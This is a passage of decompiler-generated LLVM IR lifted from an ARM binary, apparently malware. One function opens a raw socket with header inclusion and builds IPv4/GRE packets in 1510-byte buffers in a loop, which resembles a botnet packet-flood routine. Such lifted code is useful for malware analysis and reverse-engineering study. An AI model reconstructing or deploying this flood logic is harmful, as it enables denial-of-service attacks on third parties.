  %v3_9d08 = sdiv i32 %v1_9d04, 256
  store i32 %v3_9d08, i32* %r1.global-to-local, align 4
  %v3_9d0c39 = udiv i32 %v3_9cfc, 256
  store i32 %v3_9d0c39, i32* %r3.global-to-local, align 4
  %v1_9d10 = trunc i32 %v3_9d0c39 to i8
  %v2_9d10 = load i32, i32* @r5, align 4
  %v3_9d10 = add i32 %v2_9d10, 5
  %v4_9d10 = inttoptr i32 %v3_9d10 to i8*
  store i8 %v1_9d10, i8* %v4_9d10, align 1
  %v0_9d14 = load i32, i32* %r0.global-to-local, align 4
  %v1_9d14 = trunc i32 %v0_9d14 to i8
  %v2_9d14 = load i32, i32* @r5, align 4
  %v3_9d14 = add i32 %v2_9d14, 4
  %v4_9d14 = inttoptr i32 %v3_9d14 to i8*
  store i8 %v1_9d14, i8* %v4_9d14, align 1
  %v0_9d18 = load i32, i32* %r1.global-to-local, align 4
  %v1_9d18 = trunc i32 %v0_9d18 to i8
  %v2_9d18 = load i32, i32* @r6, align 4
  %v3_9d18 = add i32 %v2_9d18, 5
  %v4_9d18 = inttoptr i32 %v3_9d18 to i8*
  store i8 %v1_9d18, i8* %v4_9d18, align 1
  store i32 %v3_97d4, i32* %r1.global-to-local, align 4
  %v1_9d20 = load i32, i32* @r4, align 4
  %v9_9d20 = icmp eq i32 %v3_97d4, %v1_9d20
  store i1 %v9_9d20, i1* %cpsr_z.global-to-local, align 1
  %v0_9d24 = load i32, i32* %r2.global-to-local, align 4
  %v1_9d24 = trunc i32 %v0_9d24 to i8
  %v2_9d24 = load i32, i32* @r6, align 4
  %v3_9d24 = add i32 %v2_9d24, 4
  %v4_9d24 = inttoptr i32 %v3_9d24 to i8*
  store i8 %v1_9d24, i8* %v4_9d24, align 1
  %v0_9d28 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9d28, label %dec_label_pc_9d2c, label %dec_label_pc_9cf4.dec_label_pc_9b08_crit_edge

dec_label_pc_9cf4.dec_label_pc_9b08_crit_edge:    ; preds = %dec_label_pc_9cf4
  %v1_9b0c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_9b08

dec_label_pc_9d2c:                                ; preds = %dec_label_pc_9cf4, %dec_label_pc_9afc
  %v0_9d2c = call i32 @function_e978()
  %v1_9d2c = trunc i32 %v0_9d2c to i8
  store i32 %v0_9d2c, i32* %r0.global-to-local, align 4
  store i32 %v3_97d8, i32* %r2.global-to-local, align 4
  %v4_9d34 = sdiv i32 %v0_9d2c, 256
  store i32 %v4_9d34, i32* %r3.global-to-local, align 4
  %v1_9d38 = load i32, i32* @r4, align 4
  %v9_9d38 = icmp eq i32 %v3_97d8, %v1_9d38
  store i1 %v9_9d38, i1* %cpsr_z.global-to-local, align 1
  %v3_9d3c = load i32, i32* @r5, align 4
  %v4_9d3c = add i32 %v3_9d3c, 58
  %v5_9d3c = inttoptr i32 %v4_9d3c to i8*
  store i8 %v1_9d2c, i8* %v5_9d3c, align 1
  %v0_9d40 = load i32, i32* %r3.global-to-local, align 4
  %v1_9d40 = trunc i32 %v0_9d40 to i8
  %v2_9d40 = load i32, i32* @r7, align 4
  %v3_9d40 = add i32 %v2_9d40, 1
  %v4_9d40 = inttoptr i32 %v3_9d40 to i8*
  store i8 %v1_9d40, i8* %v4_9d40, align 1
  %v0_9d44 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9d44, label %dec_label_pc_9d48, label %dec_label_pc_9b14

dec_label_pc_9d48:                                ; preds = %dec_label_pc_9d2c, %dec_label_pc_9b08
  %v0_9d48 = call i32 @function_e978()
  %v1_9d48 = trunc i32 %v0_9d48 to i8
  store i32 %v0_9d48, i32* %r0.global-to-local, align 4
  %v4_9d4c43 = udiv i32 %v0_9d48, 256
  %v1_9d50 = trunc i32 %v4_9d4c43 to i8
  %v2_9d50 = load i32, i32* @r7, align 4
  %v3_9d50 = add i32 %v2_9d50, 3
  %v4_9d50 = inttoptr i32 %v3_9d50 to i8*
  store i8 %v1_9d50, i8* %v4_9d50, align 1
  store i32 %v1_97c8, i32* %r3.global-to-local, align 4
  store i1 %v2_9d58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9d58, label %bb108, label %bb107

bb107:                                            ; preds = %dec_label_pc_9d48
  %v1_9d5c = load i32, i32* @r5, align 4
  %v2_9d5c = add i32 %v1_9d5c, 16
  %v3_9d5c = inttoptr i32 %v2_9d5c to i32*
  %v4_9d5c = load i32, i32* %v3_9d5c, align 4
  store i32 %v4_9d5c, i32* %r3.global-to-local, align 4
  br label %bb108

bb108:                                            ; preds = %dec_label_pc_9d48, %bb107
  %v3_9d60 = load i32, i32* @r7, align 4
  %v4_9d60 = add i32 %v3_9d60, 2
  %v5_9d60 = inttoptr i32 %v4_9d60 to i8*
  store i8 %v1_9d48, i8* %v5_9d60, align 1
  %v0_9d64 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9d64, label %dec_label_pc_9d6c, label %bb109

bb109:                                            ; preds = %bb108
  %v1_9d64 = load i32, i32* %r3.global-to-local, align 4
  %v2_9d64 = load i32, i32* @r6, align 4
  %v3_9d64 = add i32 %v2_9d64, 16
  %v4_9d64 = inttoptr i32 %v3_9d64 to i32*
  store i32 %v1_9d64, i32* %v4_9d64, align 4
  br label %dec_label_pc_9b28

dec_label_pc_9d6c:                                ; preds = %dec_label_pc_9b14, %bb108
  %v0_9d6c = call i32 @function_e978()
  store i32 %v0_9d6c, i32* %r0.global-to-local, align 4
  %v1_9d70 = load i32, i32* @r6, align 4
  %v2_9d70 = add i32 %v1_9d70, 16
  %v3_9d70 = inttoptr i32 %v2_9d70 to i32*
  store i32 %v0_9d6c, i32* %v3_9d70, align 4
  br label %dec_label_pc_9b28

dec_label_pc_9d78:                                ; preds = %dec_label_pc_9b28
  %v0_9d78 = load i32, i32* @r7, align 4
  %v1_9d78 = add i32 %v0_9d78, 8
  store i32 %v1_9d78, i32* %r0.global-to-local, align 4
  store i32 %v5_9718, i32* @r1, align 4
  %v1_9d80 = inttoptr i32 %v1_9d78 to i8*
  %v2_9d80 = call i32 @function_eaf8(i8* %v1_9d80)
  store i32 %v2_9d80, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9b8c

dec_label_pc_9d88:                                ; preds = %dec_label_pc_97b8
  %v1_9d90 = add i32 %v5_9718, 8
  store i32 %v1_9d90, i32* %r1.global-to-local, align 4
  %v1_9d94 = add i32 %v5_9718, 66
  store i32 %v1_9d94, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_9a98.preheader

; uselistorder directives
  uselistorder i32 %v1_9d94, { 1, 0 }
  uselistorder i32 %v1_9d90, { 1, 0 }
  uselistorder i32 %v0_9d48, { 0, 2, 1 }
  uselistorder i32 %v0_9d2c, { 0, 2, 1 }
  uselistorder i32 %v3_9cfc, { 0, 2, 1 }
  uselistorder i32 %v2_9cc8, { 1, 0 }
  uselistorder i32 %v8_9ca8, { 1, 2, 0 }
  uselistorder i32 %v3_9c94, { 1, 0 }
  uselistorder i32 %v0_9c84, { 2, 0, 1, 3 }
  uselistorder i32 %v1_9c50, { 1, 2, 0 }
  uselistorder i32 %v1_9c4c, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v3_9bf0, { 1, 0, 2 }
  uselistorder i32 %v4_9bec, { 0, 2, 1 }
  uselistorder i32 %v0_9bcc, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_9bbc, { 0, 2, 1 }
  uselistorder i32 %v4_9ba0, { 1, 0 }
  uselistorder i32 %v7_9ac4, { 2, 1, 0, 3 }
  uselistorder i32 %v0_9a98, { 1, 0 }
  uselistorder i1 %v7_9ae0, { 2, 1, 0 }
  uselistorder i1 %v2_9d58, { 2, 3, 1, 0 }
  uselistorder i1 %v3_9ce8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_9a20, { 1, 0, 2 }
  uselistorder i32 %v3_98a8, { 1, 0, 2 }
  uselistorder i32 %v3_9888, { 1, 0 }
  uselistorder i32 %tmp91, { 1, 0 }
  uselistorder i32 %v1_982c, { 1, 0 }
  uselistorder i32 %v1_9828, { 2, 1, 0 }
  uselistorder i32 %v1_9814, { 1, 0 }
  uselistorder i32 %v1_9810, { 2, 1, 0 }
  uselistorder i32 %v1_9808, { 0, 2, 1 }
  uselistorder i32 %v3_9800, { 2, 1, 0 }
  uselistorder i32 %v0_97dc, { 1, 0, 2 }
  uselistorder i32 %v3_97d0, { 2, 1, 3, 0 }
  uselistorder i32 %v1_97c8, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v3_97c4, { 1, 0 }
  uselistorder i32 %v0_97c4, { 2, 1, 0 }
  uselistorder i32 %v0_97bc, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_97b8, { 0, 1, 2, 4, 3 }
  uselistorder i1 %v7_97b0, { 1, 0 }
  uselistorder i1 %v7_9784, { 1, 0 }
  uselistorder i32 %v3_9780, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v5_976c, { 5, 3, 0, 4, 2, 1 }
  uselistorder i32 %v1_9738, { 1, 2, 0 }
  uselistorder i32 %v5_9718, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_96cc, { 1, 0 }
  uselistorder i8 %v5_96bc, { 1, 0 }
  uselistorder i32 %v5_96a0, { 1, 0 }
  uselistorder i32 %v6_9664, { 1, 0 }
  uselistorder i32 %v2_964c, { 0, 3, 1, 2 }
  uselistorder i32 %v1_9630, { 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 12, 11 }
  uselistorder i32* %r4.global-to-local, { 20, 21, 22, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 5, 6, 7, 8, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20, 19, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 55, 56, 57, 58, 59, 60, 61, 62, 36, 37, 38, 39, 40, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 20, 18, 19, 21, 1, 22, 23, 24, 25, 26, 45, 46, 47, 48, 49, 50, 52, 51, 53, 27, 28, 29, 30, 31, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 28, 29, 30, 31, 32, 34, 33, 35, 36, 37, 38, 39, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 40, 41, 42, 44, 43, 45, 46, 48, 47, 22, 23, 25, 24, 27, 26, 0 }
  uselistorder i32* %r0.global-to-local, { 6, 5, 7, 10, 11, 8, 9, 13, 12, 27, 2, 28, 29, 30, 1, 31, 32, 34, 33, 35, 36, 37, 38, 39, 14, 18, 15, 16, 17, 20, 19, 40, 4, 3, 41, 42, 43, 44, 45, 46, 21, 22, 23, 24, 25, 26, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 10, 2, 3, 4, 5, 6, 11, 12, 13, 7, 8, 9 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 19, 20, 21, 22, 23, 24, 25, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 26, 27, 28 }
  uselistorder label %dec_label_pc_9d6c, { 1, 0 }
  uselistorder label %bb108, { 1, 0 }
  uselistorder label %dec_label_pc_9c68, { 1, 0 }
  uselistorder label %dec_label_pc_9b8c, { 1, 0 }
  uselistorder label %dec_label_pc_9b28, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9a98.preheader, { 1, 0 }
  uselistorder label %bb105, { 1, 0 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %bb100, { 1, 0 }
  uselistorder label %bb98, { 1, 0 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %bb94, { 1, 0 }
}

define i32 @function_9da8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9da8:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_9da8 = load i32, i32* @r4, align 4
  %v15_9da8 = load i32, i32* @r8, align 4
  %v1_9dac = urem i32 %arg1, 256
  store i32 %v1_9dac, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 %v1_9dac, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_9dc4 = urem i32 %arg3, 256
  store i32 %v1_9dc4, i32* @r4, align 4
  %v2_9dc8 = call i32 @function_126cc(i32 %v1_9dac, i32 4)
  %v0_9dcc = load i32, i32* @r5, align 4
  store i32 %v0_9dcc, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9ddc = load i32, i32* @r4, align 4
  store i32 %v0_9ddc, i32* %r0.global-to-local, align 4
  %v5_9de0 = inttoptr i32 %v0_9dcc to i32*
  %v6_9de0 = call i32 @function_85e0(i32 %v0_9ddc, i32* %v5_9de0, i32 2, i32 0)
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_9df8 = load i32, i32* @r5, align 4
  store i32 %v0_9df8, i32* %r1.global-to-local, align 4
  %v0_9dfc = load i32, i32* @r4, align 4
  store i32 %v0_9dfc, i32* %r0.global-to-local, align 4
  %v5_9e00 = trunc i32 %v6_9de0 to i8
  %v6_9e04 = inttoptr i32 %v0_9df8 to i32*
  %v7_9e04 = call i32 @function_85e0(i32 %v0_9dfc, i32* %v6_9e04, i32 3, i32 65535)
  %v0_9e08 = load i32, i32* @r5, align 4
  store i32 %v0_9e08, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_9e04, i32* @r7, align 4
  %v0_9e18 = load i32, i32* @r4, align 4
  store i32 %v0_9e18, i32* %r0.global-to-local, align 4
  %v4_9e1c = inttoptr i32 %v0_9e08 to i32*
  %v5_9e1c = call i32 @function_85e0(i32 %v0_9e18, i32* %v4_9e1c, i32 4, i32 64)
  %v0_9e28 = load i32, i32* @r5, align 4
  store i32 %v0_9e28, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9e34 = load i32, i32* @r4, align 4
  store i32 %v0_9e34, i32* %r0.global-to-local, align 4
  %v5_9e38 = trunc i32 %v5_9e1c to i8
  %v6_9e3c = inttoptr i32 %v0_9e28 to i32*
  %v7_9e3c = call i32 @function_85e0(i32 %v0_9e34, i32* %v6_9e3c, i32 5, i32 1)
  %v1_9e48 = urem i32 %v7_9e3c, 256
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_9e54 = load i32, i32* @r5, align 4
  store i32 %v0_9e54, i32* %r1.global-to-local, align 4
  %v0_9e58 = load i32, i32* @r4, align 4
  store i32 %v0_9e58, i32* %r0.global-to-local, align 4
  %v5_9e60 = inttoptr i32 %v0_9e54 to i32*
  %v6_9e60 = call i32 @function_85e0(i32 %v0_9e58, i32* %v5_9e60, i32 6, i32 65535)
  %v0_9e68 = load i32, i32* @r5, align 4
  store i32 %v0_9e68, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_9e60, i32* @sl, align 4
  %v0_9e78 = load i32, i32* @r4, align 4
  store i32 %v0_9e78, i32* %r0.global-to-local, align 4
  %v4_9e7c = inttoptr i32 %v0_9e68 to i32*
  %v5_9e7c = call i32 @function_85e0(i32 %v0_9e78, i32* %v4_9e7c, i32 7, i32 65535)
  %v0_9e80 = load i32, i32* @r5, align 4
  store i32 %v0_9e80, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_9e7c, i32* @r8, align 4
  %v0_9e90 = load i32, i32* @r4, align 4
  store i32 %v0_9e90, i32* %r0.global-to-local, align 4
  %v4_9e94 = inttoptr i32 %v0_9e80 to i32*
  %v5_9e94 = call i32 @function_85e0(i32 %v0_9e90, i32* %v4_9e94, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9ea4 = load i32, i32* @r5, align 4
  store i32 %v0_9ea4, i32* %r1.global-to-local, align 4
  %v0_9ea8 = load i32, i32* @r4, align 4
  store i32 %v0_9ea8, i32* %r0.global-to-local, align 4
  %v4_9eac = inttoptr i32 %v0_9ea4 to i32*
  %v5_9eac = call i32 @function_85e0(i32 %v0_9ea8, i32* %v4_9eac, i32 1, i32 1)
  %v1_9eb4 = urem i32 %v5_9eac, 256
  %v0_9eb8 = load i32, i32* @r5, align 4
  store i32 %v0_9eb8, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9ec4 = load i32, i32* @r4, align 4
  store i32 %v0_9ec4, i32* %r0.global-to-local, align 4
  %v5_9ecc = inttoptr i32 %v0_9eb8 to i32*
  %v6_9ecc = call i32 @function_85e0(i32 %v0_9ec4, i32* %v5_9ecc, i32 19, i32 0)
  %v0_9ed4 = load i32, i32* @r5, align 4
  store i32 %v0_9ed4, i32* %r1.global-to-local, align 4
  %v2_9ed8 = load i32, i32* @global_var_1cb1c.49, align 4
  store i32 %v2_9ed8, i32* %r3.global-to-local, align 4
  store i32 %v6_9ecc, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_9ee4 = load i32, i32* @r4, align 4
  store i32 %v0_9ee4, i32* %r0.global-to-local, align 4
  %v4_9ee8 = inttoptr i32 %v0_9ed4 to i32*
  %v5_9ee8 = call i32 @function_85e0(i32 %v0_9ee4, i32* %v4_9ee8, i32 25, i32 %v2_9ed8)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_9efc = call i32 @function_123e0(i32 2, i32 3, i32 6)
  store i32 %v3_9efc, i32* %r0.global-to-local, align 4
  %v7_9f00 = icmp eq i32 %v3_9efc, -1
  store i1 %v7_9f00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9f00, label %dec_label_pc_a380, label %dec_label_pc_9f0c

dec_label_pc_9f0c:                                ; preds = %dec_label_pc_9da8
  store i32 1, i32* %stack_var_-40, align 4
  %v6_9f14 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_9f14, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v6_9f28 = call i32 @function_123b0(i32 %v3_9efc, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 4)
  store i32 %v6_9f28, i32* %r0.global-to-local, align 4
  %v7_9f2c = icmp eq i32 %v6_9f28, -1
  store i1 %v7_9f2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9f2c, label %dec_label_pc_a378, label %dec_label_pc_9f34

dec_label_pc_9f34:                                ; preds = %dec_label_pc_9f0c
  %v0_9f34 = load i32, i32* @sl, align 4
  %v0_9f40 = load i32, i32* @r8, align 4
  %v3_9f40 = mul i32 %v0_9f40, 65536
  store i32 %v3_9f40, i32* %r8.global-to-local, align 4
  %v0_9f44 = load i32, i32* @r7, align 4
  %v0_9f48 = load i32, i32* @r6, align 4
  %v1_9f48 = urem i32 %v0_9f48, 256
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_9f50 = urem i32 %v0_9f34, 65536
  store i32 %v3_9f50, i32* %r2.global-to-local, align 4
  %v3_9f54 = urem i32 %v0_9f40, 65536
  store i32 %v3_9f54, i32* %r3.global-to-local, align 4
  %v0_9f58 = load i32, i32* @fp, align 4
  %v2_9f58 = icmp eq i32 %v0_9f58, 0
  store i1 %v2_9f58, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  %v3_9f68 = urem i32 %v0_9f44, 65536
  store i32 %v3_9f68, i32* @sl, align 4
  %tmp84 = icmp slt i32 %v0_9f58, 1
  br i1 %tmp84, label %dec_label_pc_a4a4, label %dec_label_pc_9f78

dec_label_pc_9f78:                                ; preds = %dec_label_pc_9f34
  %v3_9f7c = mul i32 %v5_9e94, 65536
  %v1_9f80 = add i32 %v3_9f7c, 3407872
  %v3_9f88 = udiv i32 %v1_9f80, 256
  %v0_9f44.not = or i32 %v0_9f44, -65536
  %v1_9f98 = xor i32 %v0_9f44.not, 65535
  %v1_9f9c = urem i32 %v0_9f40, 256
  %tmp85 = mul nsw i32 %v1_9f98, 256
  %v1_9fb4 = and i32 %v3_9f88, 65280
  %v1_9fb8 = add i32 %v3_9f7c, 524288
  %v4_9fbc = udiv i32 %v1_9f80, 16777216
  %v5_9fbc = or i32 %v1_9fb4, %v4_9fbc
  store i32 %v5_9fbc, i32* %r0.global-to-local, align 4
  %v1_9fc0 = add i32 %v3_9f7c, 1835008
  %v1_9fc8 = and i32 %tmp85, 65280
  store i32 %v1_9fc8, i32* @lr, align 4
  %tmp86 = udiv i32 %v1_9f98, 256
  %tmp87 = udiv i32 %v0_9f44, 256
  %v5_9fdc = trunc i32 %tmp86 to i8
  %tmp88 = udiv i32 %v0_9f34, 256
  %sext29 = mul i32 %tmp87, 16777216
  %v4_9ffc = sdiv i32 %sext29, 16777216
  %v3_a008 = mul nuw nsw i32 %v1_9f9c, 256
  store i32 %v3_a008, i32* @r5, align 4
  %v3_a00c = udiv i32 %v1_9fb8, 256
  %tmp89 = udiv i32 %v0_9f40, 256
  %v4_a014 = urem i32 %tmp89, 256
  %v5_a014 = or i32 %v4_a014, %v3_a008
  store i32 %v5_a014, i32* @r7, align 4
  %v3_a018 = ashr i32 %sext29, 31
  %v3_a024 = sdiv i32 %v1_9fc0, 16777216
  %v1_a028 = and i32 %v3_a00c, 65280
  store i32 %v1_a028, i32* @r6, align 4
  %sext30 = mul i32 %tmp88, 16777216
  %v4_a030 = sdiv i32 %sext30, 16777216
  %v3_a034 = ashr i32 %v1_9fc0, 31
  %v3_a038 = udiv i32 %v1_9f98, 65536
  %v4_a03c = udiv i32 %v1_9fb8, 16777216
  %v5_a03c = or i32 %v1_a028, %v4_a03c
  store i32 %v5_a03c, i32* %r8.global-to-local, align 4
  %v3_a048 = ashr i32 %sext30, 31
  store i32 %v3_a048, i32* %r1.global-to-local, align 4
  store i32 %v1_9f9c, i32* %r2.global-to-local, align 4
  %v3_a05041 = udiv i32 %v1_a028, 256
  store i32 %v3_a05041, i32* %r3.global-to-local, align 4
  %v5_a058 = trunc i32 %v3_a048 to i8
  store i32 0, i32* @r4, align 4
  %v4_a0b4 = sext i8 %v5_9e38 to i32
  %sext = mul i32 %v1_9f80, 256
  %v4_a0bc = sdiv i32 %sext, 16777216
  %sext16 = mul nuw i32 %v4_9fbc, 16777216
  %v4_a0cc = sdiv i32 %sext16, 16777216
  %v2_a1a0 = icmp eq i32 %v1_9f48, 0
  %sext20 = mul i32 %v1_9fb8, 256
  %v4_a1c0 = sdiv i32 %sext20, 16777216
  %sext21 = mul i32 %v0_9f40, 16777216
  %v7_a1d8 = sdiv i32 %sext21, 16777216
  %v1_a0c8 = trunc i32 %v4_a0bc to i8
  br label %dec_label_pc_a068

dec_label_pc_a068:                                ; preds = %bb96, %dec_label_pc_9f78
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_a074 = call i32 @function_126cc(i32 1510, i32 4)
  store i32 %v2_a074, i32* %r0.global-to-local, align 4
  store i32 %v2_9dc8, i32* %r1.global-to-local, align 4
  %v3_a07c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_a07c, i32* %r3.global-to-local, align 4
  %v2_a080 = load i32, i32* @r4, align 4
  %v5_a080 = mul i32 %v2_a080, 4
  %v6_a080 = add i32 %v5_a080, %v2_9dc8
  %v7_a080 = inttoptr i32 %v6_a080 to i32*
  store i32 %v2_a074, i32* %v7_a080, align 4
  %v0_a084 = load i32, i32* %r1.global-to-local, align 4
  %v1_a084 = load i32, i32* %r3.global-to-local, align 4
  %v4_a084 = mul i32 %v1_a084, 4
  %v5_a084 = add i32 %v4_a084, %v0_a084
  %v6_a084 = inttoptr i32 %v5_a084 to i32*
  %v7_a084 = load i32, i32* %v6_a084, align 4
  store i32 %v7_a084, i32* %r4.global-to-local, align 4
  %v1_a088 = inttoptr i32 %v7_a084 to i8*
  %v2_a088 = load i8, i8* %v1_a088, align 1
  %tmp = urem i8 %v2_a088, 16
  %v1_a08c = zext i8 %tmp to i32
  %v1_a090 = or i32 %v1_a08c, 64
  store i32 %v1_a090, i32* %r2.global-to-local, align 4
  %v1_a094 = trunc i32 %v1_a090 to i8
  store i8 %v1_a094, i8* %v1_a088, align 1
  %v0_a098 = load i32, i32* %r4.global-to-local, align 4
  %v1_a098 = inttoptr i32 %v0_a098 to i8*
  %v2_a098 = load i8, i8* %v1_a098, align 1
  %v1_a09c = and i8 %v2_a098, -16
  %v1_a0a0 = or i8 %v1_a09c, 5
  store i32 %v1_9e48, i32* %r2.global-to-local, align 4
  store i8 %v1_a0a0, i8* %v1_a098, align 1
  %v2_a0b0 = load i32, i32* %r4.global-to-local, align 4
  %v3_a0b0 = add i32 %v2_a0b0, 1
  %v4_a0b0 = inttoptr i32 %v3_a0b0 to i8*
  store i8 %v5_9e00, i8* %v4_a0b0, align 1
  store i32 %v4_a0b4, i32* %r1.global-to-local, align 4
  %v2_a0b8 = load i32, i32* %r4.global-to-local, align 4
  %v3_a0b8 = add i32 %v2_a0b8, 8
  %v4_a0b8 = inttoptr i32 %v3_a0b8 to i8*
  store i8 %v5_9e38, i8* %v4_a0b8, align 1
  store i32 %v4_a0bc, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_a0c4 = load i32, i32* %r2.global-to-local, align 4
  %v9_a0c4 = icmp eq i32 %v0_a0c4, 0
  store i1 %v9_a0c4, i1* %cpsr_z.global-to-local, align 1
  %v2_a0c8 = load i32, i32* %r4.global-to-local, align 4
  %v3_a0c8 = add i32 %v2_a0c8, 3
  %v4_a0c8 = inttoptr i32 %v3_a0c8 to i8*
  store i8 %v1_a0c8, i8* %v4_a0c8, align 1
  store i32 %v4_a0cc, i32* %r2.global-to-local, align 4
  %v0_a0d0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a0d0, label %.thread23, label %.thread

.thread:                                          ; preds = %dec_label_pc_a068
  %v1_a0d0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v1_a0d0, i32* %r3.global-to-local, align 4
  %v2_a0d4 = trunc i32 %v1_a0d0 to i8
  %v3_a0d4 = load i32, i32* %r4.global-to-local, align 4
  %v4_a0d4 = add i32 %v3_a0d4, 7
  %v5_a0d4 = inttoptr i32 %v4_a0d4 to i8*
  store i8 %v2_a0d4, i8* %v5_a0d4, align 1
  %v0_a0d8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a0d8.pr.pr, label %.thread23, label %bb

bb:                                               ; preds = %.thread
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_a0dc = load i32, i32* %r4.global-to-local, align 4
  %v4_a0dc = add i32 %v3_a0dc, 6
  %v5_a0dc = inttoptr i32 %v4_a0dc to i8*
  store i8 64, i8* %v5_a0dc, align 1
  br label %.thread23

.thread23:                                        ; preds = %dec_label_pc_a068, %.thread, %bb
  %v0_a0e0 = load i32, i32* %r2.global-to-local, align 4
  %v1_a0e0 = trunc i32 %v0_a0e0 to i8
  %v2_a0e0 = load i32, i32* %r4.global-to-local, align 4
  %v3_a0e0 = add i32 %v2_a0e0, 2
  %v4_a0e0 = inttoptr i32 %v3_a0e0 to i8*
  store i8 %v1_a0e0, i8* %v4_a0e0, align 1
  store i32 %v3_a018, i32* %r2.global-to-local, align 4
  store i32 %v4_9ffc, i32* %r1.global-to-local, align 4
  %v2_a0f0 = load i32, i32* %r4.global-to-local, align 4
  %v3_a0f0 = add i32 %v2_a0f0, 9
  %v4_a0f0 = inttoptr i32 %v3_a0f0 to i8*
  store i8 47, i8* %v4_a0f0, align 1
  %v0_a0f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_a0f4 = trunc i32 %v0_a0f4 to i8
  %v2_a0f4 = load i32, i32* %r4.global-to-local, align 4
  %v3_a0f4 = add i32 %v2_a0f4, 5
  %v4_a0f4 = inttoptr i32 %v3_a0f4 to i8*
  store i8 %v1_a0f4, i8* %v4_a0f4, align 1
  %v3_a0f8 = load i32, i32* %stack_var_-40, align 4
  %v5_a100 = mul i32 %v3_a0f8, 24
